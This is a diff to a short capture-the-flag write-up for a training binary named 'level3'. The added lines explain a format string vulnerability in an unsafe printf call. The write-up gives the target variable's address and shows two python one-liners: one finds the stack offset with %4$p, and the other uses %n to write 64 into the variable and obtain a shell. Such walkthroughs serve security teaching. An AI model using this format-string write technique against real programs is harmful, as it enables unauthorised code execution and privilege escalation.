@@ -1,3 +1,6 @@
+when reading the source code of the program, we see that if the global variable m contain the value 64, we will get access to a shell
+the program take input and put it inside a unsecure printf (printf(s)), that is a format string vulnerability, we can exploit it to read the stack memory and write to any address we want
+we found that the address of m is 0x0804988c, we will insert it on the stack in little endian, we can confirm that the address is correctly inserted at the 4th position with this :
 python -c 'print "\x8c\x98\x04\x08" + "%4$p"' | ./level3
-
+now that the address is on the stack, we use the %n format specifier to write the amount of characters preceding it at the 4th position (so the address of m) :
 (python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' ; cat) | ./level3
